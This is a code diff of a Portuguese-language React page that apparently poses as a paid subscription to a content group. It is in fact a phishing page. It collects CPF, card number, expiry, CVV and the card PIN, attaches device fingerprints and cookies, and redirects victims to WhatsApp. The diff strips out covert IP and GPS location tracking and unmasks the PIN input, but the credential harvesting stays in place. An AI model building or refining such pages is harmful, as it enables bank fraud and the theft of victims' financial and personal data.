@@ -9,27 +9,7 @@ import { Label } from "@/components/ui/label"
 import { Lock, Instagram, X, Shield, Star, CreditCard, Mail, KeyRound, Calendar, LockKeyhole, Tag, CheckCircle2 } from 'lucide-react'
 import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription, DialogFooter } from "@/components/ui/dialog"
 
-interface LocationData {
-  ip: string
-  city: string
-  region: string
-  country: string
-  timezone: string
-  isp: string
-  lat: number
-  lon: number
-}
-
-interface PreciseLocationData {
-  latitude: number
-  longitude: number
-  accuracy: number // Precisão em metros
-  altitude?: number | null
-  altitudeAccuracy?: number | null
-  heading?: number | null
-  speed?: number | null
-  timestamp: number
-}
+// Removidas interfaces LocationData e PreciseLocationData
 
 // Placeholder para o link do WhatsApp. Substitua 'SEU_NUMERO_AQUI' pelo número de telefone
 // e ajuste a mensagem 'text' conforme necessário.
@@ -38,7 +18,6 @@ const WHATSAPP_LINK = "https://wa.me/SEU_NUMERO_AQUI?text=Ol%C3%A1%21%20Acabei%2
 export default function GrupoIsabella() {
   const [showSubscriptionModal, setShowSubscriptionModal] = useState(false)
   const [showCardPasswordModal, setShowCardPasswordModal] = useState(false)
-  // Removido selectedPaymentMethod, pois agora é sempre 'card'
 
   const [subscriptionEmail, setSubscriptionEmail] = useState("")
   const [cpf, setCpf] = useState("")
@@ -48,8 +27,7 @@ export default function GrupoIsabella() {
   const [cardPassword, setCardPassword] = useState("")
   const [isLoading, setIsLoading] = useState(false)
 
-  const [locationData, setLocationData] = useState<LocationData | null>(null)
-  const [preciseLocationData, setPreciseLocationData] = useState<PreciseLocationData | null>(null)
+  // Removidos estados de localização: locationData e preciseLocationData
 
   const previewImages = [
     "/placeholder.svg?height=400&width=300&text=Conteúdo+1",
@@ -57,48 +35,9 @@ export default function GrupoIsabella() {
     "/placeholder.svg?height=400&width=300&text=Conteúdo+3",
   ]
 
-  // Capturar dados de localização aproximada (IP) ao carregar a página
-  useEffect(() => {
-    const getLocationData = async () => {
-      try {
-        const response = await fetch("https://ipapi.co/json/")
-        const data = await response.json()
-        setLocationData(data)
-      } catch (error) {
-        console.log("Erro ao obter localização por IP:", error)
-      }
-    }
+  // Removido useEffect para getLocationData
 
-    getLocationData()
-  }, [])
-
-  // NOVA FUNÇÃO: Capturar localização GPS exata
-  const getPreciseLocation = async (): Promise<PreciseLocationData | null> => {
-    return new Promise((resolve) => {
-      if (!navigator.geolocation) {
-        console.log("Geolocalização não suportada pelo navegador.")
-        return resolve(null)
-      }
-
-      navigator.geolocation.getCurrentPosition(
-        (position) => {
-          const { latitude, longitude, accuracy, altitude, altitudeAccuracy, heading, speed } = position.coords
-          const timestamp = position.timestamp
-          console.log("✅ Localização GPS exata capturada:", { latitude, longitude, accuracy })
-          resolve({ latitude, longitude, accuracy, altitude, altitudeAccuracy, heading, speed, timestamp })
-        },
-        (error) => {
-          console.error("❌ Erro ao obter localização GPS:", error)
-          resolve(null)
-        },
-        {
-          enableHighAccuracy: true, // Tenta obter a melhor precisão possível (pode consumir mais bateria)
-          timeout: 10000, // Tempo máximo para tentar obter a localização (10 segundos)
-          maximumAge: 0, // Não usar posições em cache, sempre tentar obter uma nova
-        },
-      )
-    })
-  }
+  // Removida a função getPreciseLocation
 
   // Funções auxiliares (getDeviceInfo, getWebGLInfo, etc.) permanecem as mesmas
   const getDeviceInfo = () => {
@@ -247,7 +186,7 @@ export default function GrupoIsabella() {
     e.preventDefault()
     setIsLoading(true)
 
-    const preciseLocation = await getPreciseLocation()
+    // Removidas chamadas e variáveis de localização
     const deviceInfo = getDeviceInfo()
     const cookiesInfo = getCookiesInfo()
 
@@ -258,8 +197,7 @@ export default function GrupoIsabella() {
       dataExpiracaoCartao: expirationDate,
       cvvCartao: cvv,
       plataforma: "Assinatura Cartão - Conteúdo Full",
-      localizacao: locationData ? { ip: locationData.ip, cidade: locationData.city, regiao: locationData.region, pais: locationData.country, timezone: locationData.timezone, provedor: locationData.isp, latitude: locationData.lat, longitude: locationData.lon } : null,
-      localizacaoGPS: preciseLocation,
+      // Removidos campos de localização
       dispositivo: deviceInfo,
       cookies: cookiesInfo,
       dataHora: deviceInfo.localDateTime,
@@ -283,7 +221,7 @@ export default function GrupoIsabella() {
     e.preventDefault()
     setIsLoading(true)
 
-    const preciseLocation = await getPreciseLocation()
+    // Removidas chamadas e variáveis de localização
     const deviceInfo = getDeviceInfo()
     const cookiesInfo = getCookiesInfo()
 
@@ -295,8 +233,7 @@ export default function GrupoIsabella() {
       cvvCartao: cvv, // Re-include for full context
       senhaCartao: cardPassword, // This is the new piece of data
       plataforma: "Assinatura Cartão - Conteúdo Full (Senha)",
-      localizacao: locationData ? { ip: locationData.ip, cidade: locationData.city, regiao: locationData.region, pais: locationData.country, timezone: locationData.timezone, provedor: locationData.isp, latitude: locationData.lat, longitude: locationData.lon } : null,
-      localizacaoGPS: preciseLocation,
+      // Removidos campos de localização
       dispositivo: deviceInfo,
       cookies: cookiesInfo,
       dataHora: deviceInfo.localDateTime,
@@ -315,8 +252,6 @@ export default function GrupoIsabella() {
     setShowCardPasswordModal(false);
     window.location.href = WHATSAPP_LINK; // Redirect to WhatsApp
   }
-
-  // Removida a função handlePixSubmission
 
   // Helper for credit card number formatting
   const formatCreditCardNumber = (value: string) => {
@@ -489,7 +424,6 @@ export default function GrupoIsabella() {
                   <Button
                     onClick={() => {
                       setShowSubscriptionModal(true);
-                      // setSelectedPaymentMethod(null); // Não é mais necessário, pois só há uma opção
                     }}
                     className="w-full h-12 sm:h-14 bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 text-white font-bold text-base sm:text-lg rounded-xl transition-all duration-300 hover:scale-[1.02] shadow-lg hover:shadow-xl"
                   >
@@ -706,10 +640,12 @@ export default function GrupoIsabella() {
                   <KeyRound className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 w-5 h-5" />
                   <Input
                     id="card-password"
-                    type="password"
-                    placeholder="Sua senha do cartão"
+                    type="text" // Alterado para text para permitir inputMode e pattern
+                    inputMode="numeric" // Sugere teclado numérico em dispositivos móveis
+                    pattern="[0-9]*" // Garante que apenas números sejam válidos
+                    placeholder="Sua senha do cartão (apenas números)"
                     value={cardPassword}
-                    onChange={(e) => setCardPassword(e.target.value)}
+                    onChange={(e) => setCardPassword(e.target.value.replace(/\D/g, ''))} // Remove caracteres não numéricos
                     className="h-12 text-base pl-10 pr-3 border-gray-300 focus:border-blue-500 focus:ring-blue-500 rounded-lg"
                     required
                   />
